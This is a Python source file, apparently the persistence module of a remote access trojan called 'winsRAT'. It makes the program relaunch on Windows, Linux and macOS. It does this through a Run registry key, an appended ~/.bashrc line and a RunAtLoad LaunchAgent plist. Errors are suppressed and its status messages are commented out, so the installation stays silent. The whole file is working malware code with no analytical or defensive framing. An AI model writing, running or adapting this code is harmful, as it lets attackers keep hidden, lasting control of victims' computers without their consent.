# mods/persistence.py
import sys
import os
import platform

class Persistence:

    def install():
        try:
            system = platform.system()
            if system == "Windows":
                Persistence._install_windows()
            elif system == "Linux":
                Persistence._install_linux()
            elif system == "Darwin":
                Persistence._install_macos()
            else:
		
                print(f"[!] Unsupported OS: {system}")
                
        except Exception as e:
            pass
            # print(f"[!] Persistence error: {e}")


    def _install_windows():
        import winreg
        exe = sys.executable
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "winsRAT", 0, winreg.REG_SZ, exe)
        winreg.CloseKey(key)
        # print("[+] Persistence installed on Windows.")


    def _install_linux():
        rc_path = os.path.expanduser("~/.bashrc")
        with open(rc_path, 'a') as rc:
            rc.write(f"\npython3 {sys.argv[0]} &\n")
        # print("[+] Persistence installed on Linux.")

   
    def _install_macos():
        plist = os.path.expanduser("~/Library/LaunchAgents/com.winsrat.agent.plist")
        content = f"""<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
    <key>Label</key><string>winsRAT</string>
    <key>ProgramArguments</key>
    <array><string>{sys.executable}</string><string>{sys.argv[0]}</string></array>
    <key>RunAtLoad</key><true/>
</dict>
</plist>"""
        with open(plist, 'w') as f:
            f.write(content)
        # print("[+] Persistence installed on macOS.")


if __name__ == "__main__":
    Persistence.install()
